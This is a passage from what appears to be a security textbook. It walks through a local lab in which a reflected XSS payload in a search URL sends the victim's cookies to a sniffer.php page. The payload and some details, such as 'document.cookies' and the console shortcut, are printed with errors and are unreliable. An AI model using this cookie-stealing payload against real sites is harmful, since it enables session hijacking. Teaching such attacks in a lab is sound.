# Warning

Time alone is a poor seed for a session value. PHP has built-in session handling; don't try to reinvent the wheel. In most cases when a language has provided a facility for pseudorandom number session generation, use that instead. We are more likely to create vulnerable code when we try to create something new, and it may not be as secure as what the experts have written—unless you're an expert in that field, and in that case, remember to contribute back when you create something new and awesome.

Now that all our pieces have been created, it's time to put together our exploit. First, we need to make sure our output file is created and owned by the Web server. To do that, we use the command touch outfile in the /var/www directory and then chown www-data outfile. Now, our output file is issued by the Web server. Because of this, our sniffer script, sniffer.php, should be able to write to our output file. Our cookie file, setcookie.php, is the first page we need to visit. Going to http://localhost/setcookie.php should set the cookies we need to set. To verify that the cookies are set, we can open the debugger in IceWeasel. To do this "CTRL+SHIFT+5" and the console pop up at the bottom of the screen. Click on the console and then in the box at the bottom type “document.cookies. Running this code should print output with our cookies set. Next, we go to our search page. We want to formulate a URL that we can send to our target that will cause their cookies to be forwarded to our sniff page. To do that, we need to create a URL that will submit the GET request for us with your injected XSS code like this:

```
<script>document.write('<IMG SRC="http://localhost/sniffer.php?cookie='+document.cookie\');</script>
```

We will see our search box with a small image icon in it and the content of our search printed below. Fig. 9.16 shows the output file as well as the resultant Web page. Our XSS uses the JavaScript document.write method to print out an IMG tag with the